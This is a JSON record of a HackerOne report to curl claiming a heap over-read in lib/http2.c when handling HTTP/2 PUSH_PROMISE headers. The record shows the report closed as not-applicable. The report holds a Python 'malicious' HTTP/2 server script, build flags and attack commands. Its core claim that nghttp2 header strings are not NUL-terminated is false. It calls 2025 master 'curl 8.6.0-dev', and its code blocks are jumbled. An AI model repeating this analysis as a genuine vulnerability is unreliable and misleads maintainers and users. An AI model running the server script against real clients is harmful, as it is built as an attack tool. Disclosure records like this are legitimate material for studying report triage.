@@ -1,0 +1,200 @@
+{
+  "id": 3480078,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDgwMDc4",
+  "url": "https://hackerone.com/reports/3480078",
+  "title": "Heap Buffer Over-read in lib/http2.c (on_header) handling PUSH_PROMISE frames",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-12-27T19:17:59.061Z",
+  "submitted_at": "2025-12-27T19:17:59.302Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "efrsxcv",
+    "url": "/efrsxcv",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-12-28T21:28:50.989Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-12-28T15:59:27.901Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nI have discovered a Heap Buffer Over-read vulnerability in `lib/http2.c` within the `on_header` callback function. When processing HTTP/2 `PUSH_PROMISE` frames, the code incorrectly uses the `%s` format specifier on raw pointers provided by `nghttp2`.\n\nAccording to `nghttp2` documentation, the `name` and `value` pointers in the `on_header` callback are **not null-terminated**. By using `%s` without precision specifiers, `curl_maprintf` reads past the bounds of the allocated buffer into adjacent heap memory until it encounters a null byte. This leads to a Denial of Service (crash via OOM or invalid read) or potentially leaks sensitive heap memory.\n\n## Vulnerability Details\n* **File:** `lib/http2.c`\n* **Function:** `on_header`\n* **Vulnerable Logic:**\n\nInside the `on_header` function (handling `NGHTTP2_PUSH_PROMISE`), the code acts as follows:\n\n```c\n/* lib/http2.c around line 1642 in master */\nh = curl_maprintf(\"%s:%s\", name, value);\nSince name and value are not null-terminated C-strings, curl_maprintf continues reading memory indefinitely.\n\nContrast with Secure Code: In the same file (handling trailers), the developers correctly used precision specifiers:\n/* Correct usage found elsewhere in the file */\nCURL_TRC_CF(data, cf, \"[%d] trailer: %.*s: %.*s\",\n            stream->id, (int)namelen, name, (int)valuelen, value);\n\nAffected version\nReproduced on the latest master branch (commit 752d... / curl 8.6.0-dev). Platform: Linux (Reproduced with ASAN build).\n\nSteps To Reproduce:\nTo reproduce this issue, you need a malicious HTTP/2 server that sends a PUSH_PROMISE frame with a payload that triggers the over-read.\n\nNote: While curl CLI disables HTTP/2 Push by default, libcurl applications enabling it are vulnerable. For reproduction purposes using the CLI, we must ensure Push is enabled.\n\n1. Compile curl with AddressSanitizer (ASAN)\n./configure --enable-debug --enable-curldebug --with-nghttp2 --with-openssl CFLAGS=\"-fsanitize=address -g -O0\" LDFLAGS=\"-fsanitize=address\"\nmake -j4\n\n2. Setup Malicious Python Server Save the following script as repro.py. It requires pip install h2. (You also need server.key and server.crt for TLS).\nimport socket\nimport ssl\nfrom h2.connection import H2Connection\nfrom h2.events import RequestReceived\nfrom h2.config import H2Configuration\nfrom h2.settings import SettingCodes\n\ndef run_server():\n    host, port = '127.0.0.1', 8443\n    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    ctx.load_cert_chain(certfile=\"server.crt\", keyfile=\"server.key\")\n    ctx.set_alpn_protocols(['h2'])\n\n    sock = socket.socket()\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((host, port))\n    sock.listen(1)\n    print(f\"Listening on {port}...\")\n\n    while True:\n        conn, addr = sock.accept()\n        try:\n            tls_conn = ctx.wrap_socket(conn, server_side=True)\n            config = H2Configuration(client_side=False)\n            h2 = H2Connection(config=config)\n            h2.initiate_connection()\n            tls_conn.sendall(h2.data_to_send())\n\n            while True:\n                data = tls_conn.recv(65535)\n                if not data: break\n                events = h2.receive_data(data)\n                for event in events:\n                    if isinstance(event, RequestReceived):\n                        # Force enable push in python state to bypass checks\n                        h2.remote_settings[SettingCodes.ENABLE_PUSH] = 1\n\n                        # Payload: Long string without null terminator concept in H2\n                        headers = [\n                            (':method', 'GET'), (':path', '/pwn'),\n                            (':scheme', 'https'), (':authority', 'localhost'),\n                            ('x-trigger', 'A' * 5000)\n                        ]\n                        h2.push_stream(event.stream_id, 2, headers)\n                        tls_conn.sendall(h2.data_to_send())\n\n                tls_conn.sendall(h2.data_to_send())\n        except Exception:\n            pass\n        finally:\n            conn.close()\n\nif __name__ == '__main__':\n    run_server()\n\n3. Run the Attack\n- Terminal 1: python3 repro.py\n- Terminal 2: ./src/curl -v -k --http2 https://127.0.0.1:8443 (Ensure the libcurl used accepts Push, or modify lib/http2.c to force ENABLE_PUSH=1 for testing).\n\n4. Observe Results The curl process will either crash with an ASAN report or return error (56) ... returned -902:The user callback function failed.\n\nThe error -902 confirms that on_header failed, likely due to memory allocation failure when curl_maprintf attempted to read gigabytes of heap data starting from the non-null-terminated buffer.\n\n## Impact\n\nImpact\nThis is a heap buffer over-read.\n1. Denial of Service: It causes the client to crash or exhaust memory.\n2. Information Leak: It may leak adjacent heap data into the header string, which could be processed or logged by the application.\n\nRecommended Fix\nUpdate the curl_maprintf call to use precision specifiers with the length provided by nghttp2:\nh = curl_maprintf(\"%.*s:%.*s\", (int)namelen, name, (int)valuelen, value);",
+  "weakness": {
+    "id": 9,
+    "name": "Buffer Over-read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5161295,
+      "file_name": "Jepretan_layar_20251228_021245.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gc5ldz5jh7ghbja3thqv1hcetvp0?response-content-disposition=attachment%3B%20filename%3D%22Jepretan_layar_20251228_021245.png%22%3B%20filename%2A%3DUTF-8%27%27Jepretan_layar_20251228_021245.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ46JPSP6U%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042433Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQDN%2BOksRIQv9ADNRN9IpBOMxO%2B1yzPgexSOCriUwk8AHAIgJrK5l15eVuxGb7DQwvGs35TFj6i013eV7CuXq5ItyGAqsQUIBRADGgwwMTM2MTkyNzQ4NDkiDJjsoe4gdv%2FnCSOZdCqOBZlif6fsXcbv4Wq9BSrsac2H0xEk1QDU9uqXO%2FsjVMvRqbrUHj01lumaOYNMoAwmkJSKE0DUdRy7PsMBmYKeRWcE%2FUcCtZj1aG1nlsJTXbqm1UgO7Tm7oOfMp1GLQssmChIIiXTFT27PN%2FX35S3EGPQGyYm0Kv4bI2%2F1SWOfI7iAY4j6F1nQV544U3CgMxFtnibQ6T8XXqhtfzmtakszXZ8bttEFwJG1Q7XjbsR7DHX%2BtLdVHGQ3x3LNZn%2FUuosvMyPsOuu%2BajGjOmKILC%2BPyA%2BoC0BuX9xUgv30Ie2XcQ98E1NmEiwCy9%2FYuBE4RC%2BKhrKFf%2FDS2UUB74ZuiJ9Yo3DgD42OmEWH2Mwu%2Fb8YH1IGD45lEW8Ary4CdXTbUYO2roKB1noN3PblrSLPTUr9XIRu6HhyOURaco%2FGgwth2JxpvDwDYNl%2BVDqPJBaw2BYMhnl0b8RmyJJnjWujy3lUhHNjXFRkRin0juwP8MZpIGkV7TokCoHitsRzHzcLnu6FdpslQKt7HG8WQ%2FAvfxz4SLKJ034wP7weCsay4Q%2FR74V6u33X5zQYovnjduAVu%2FwfZ9Me2SSf59Wug%2Fgb3G0ppRBNS5d2uxvNy49hks9nQV974qBJ7T9s%2FQiVLPhwzciqLgjpwTDt%2FJC0c0R4iFG2WgwM%2BCC3nfWRm667CD3fGNrKMb%2FHKPp%2F%2B2%2Fz99q4ApIzMzNDolnid6mKkG%2FBtzHjngg0uyFZJzavsEv8%2FCvVgzhpeaHR56y0MhVffZV3NE%2BdcnLUS8UZvgKQ3c9soLuEXUpgBluzCnafoJCYGisBs4pbzELdaC0Z6jUcFqO1H4rUmMAI%2BHqL5OITDQmCMmm8pd1J3DLK%2BKd8WKJgAlQQPzDr6ZzSBjqxAcPZnJS4V4vJpkOjlrkRAcyx8uoIerYr8Ul43uDcGnkwhomZ14xMvO7HZUBqqq9xnNKuqv57N%2F3oFSk06mBe2lnjV7Ue32Wk5MjanbJmDgi7cKCSRWYf3ny%2BNa%2BrAySXOUWL%2F3Uf%2BkG5Yle8%2BSpYn%2FFA4PCNyZiQ%2BYeUnLCFSZiYxOWr6lCeNUK3gNwhSInYKlQF1fyX4Sjy0yQbTdwZjLsY4i5lU42jiXoZ10tl6FogNA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=405f6907e21c9e9c519bcbe0f40dadfc78ca93d0544e4da903ec13295629793e",
+      "file_size": 178035,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5161296,
+      "file_name": "Jepretan_layar_20251228_021202.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kab1mxzf6113nto1vttevovoog12?response-content-disposition=attachment%3B%20filename%3D%22Jepretan_layar_20251228_021202.png%22%3B%20filename%2A%3DUTF-8%27%27Jepretan_layar_20251228_021202.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ46JPSP6U%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042433Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQDN%2BOksRIQv9ADNRN9IpBOMxO%2B1yzPgexSOCriUwk8AHAIgJrK5l15eVuxGb7DQwvGs35TFj6i013eV7CuXq5ItyGAqsQUIBRADGgwwMTM2MTkyNzQ4NDkiDJjsoe4gdv%2FnCSOZdCqOBZlif6fsXcbv4Wq9BSrsac2H0xEk1QDU9uqXO%2FsjVMvRqbrUHj01lumaOYNMoAwmkJSKE0DUdRy7PsMBmYKeRWcE%2FUcCtZj1aG1nlsJTXbqm1UgO7Tm7oOfMp1GLQssmChIIiXTFT27PN%2FX35S3EGPQGyYm0Kv4bI2%2F1SWOfI7iAY4j6F1nQV544U3CgMxFtnibQ6T8XXqhtfzmtakszXZ8bttEFwJG1Q7XjbsR7DHX%2BtLdVHGQ3x3LNZn%2FUuosvMyPsOuu%2BajGjOmKILC%2BPyA%2BoC0BuX9xUgv30Ie2XcQ98E1NmEiwCy9%2FYuBE4RC%2BKhrKFf%2FDS2UUB74ZuiJ9Yo3DgD42OmEWH2Mwu%2Fb8YH1IGD45lEW8Ary4CdXTbUYO2roKB1noN3PblrSLPTUr9XIRu6HhyOURaco%2FGgwth2JxpvDwDYNl%2BVDqPJBaw2BYMhnl0b8RmyJJnjWujy3lUhHNjXFRkRin0juwP8MZpIGkV7TokCoHitsRzHzcLnu6FdpslQKt7HG8WQ%2FAvfxz4SLKJ034wP7weCsay4Q%2FR74V6u33X5zQYovnjduAVu%2FwfZ9Me2SSf59Wug%2Fgb3G0ppRBNS5d2uxvNy49hks9nQV974qBJ7T9s%2FQiVLPhwzciqLgjpwTDt%2FJC0c0R4iFG2WgwM%2BCC3nfWRm667CD3fGNrKMb%2FHKPp%2F%2B2%2Fz99q4ApIzMzNDolnid6mKkG%2FBtzHjngg0uyFZJzavsEv8%2FCvVgzhpeaHR56y0MhVffZV3NE%2BdcnLUS8UZvgKQ3c9soLuEXUpgBluzCnafoJCYGisBs4pbzELdaC0Z6jUcFqO1H4rUmMAI%2BHqL5OITDQmCMmm8pd1J3DLK%2BKd8WKJgAlQQPzDr6ZzSBjqxAcPZnJS4V4vJpkOjlrkRAcyx8uoIerYr8Ul43uDcGnkwhomZ14xMvO7HZUBqqq9xnNKuqv57N%2F3oFSk06mBe2lnjV7Ue32Wk5MjanbJmDgi7cKCSRWYf3ny%2BNa%2BrAySXOUWL%2F3Uf%2BkG5Yle8%2BSpYn%2FFA4PCNyZiQ%2BYeUnLCFSZiYxOWr6lCeNUK3gNwhSInYKlQF1fyX4Sjy0yQbTdwZjLsY4i5lU42jiXoZ10tl6FogNA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=074ad3d56c662cdb942726e2cda57b5deacc6c44cddc342dd362a3008c325208",
+      "file_size": 958774,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "2026",
+    "tw181802",
+    "i-amlogan",
+    "haydar98",
+    "hackwidmaddy",
+    "talatin",
+    "sk8lynnhal",
+    "roydennis"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3480078",
+  "votes": 8,
+  "latest_disclosable_activity_at": "2025-12-28T21:28:50.869Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:24:33.566075",
+    "source": "https://hackerone.com/reports/3480078.json",
+    "report_id": 3480078
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDgwMDc4",
+    "databaseId": "3480078",
+    "title": "Heap Buffer Over-read in lib/http2.c (on_header) handling PUSH_PROMISE frames",
+    "url": "https://hackerone.com/reports/3480078",
+    "state": null,
+    "substate": "not-applicable",
+    "disclosed_at": "2025-12-28T21:28:50.989Z",
+    "created_at": "2025-12-27T19:17:59.061Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzk=",
+      "name": "Buffer Over-read",
+      "external_id": "cwe-126"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "efrsxcv"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM0ODAwNzg=",
+    "_id": "3480078",
+    "disclosed": true,
+    "votes": 8,
+    "latest_disclosable_activity_at": "2025-12-28T21:28:50.869Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDgwMDc4",
+      "databaseId": "3480078",
+      "title": "Heap Buffer Over-read in lib/http2.c (on_header) handling PUSH_PROMISE frames",
+      "url": "https://hackerone.com/reports/3480078",
+      "disclosed_at": "2025-12-28T21:28:50.989Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
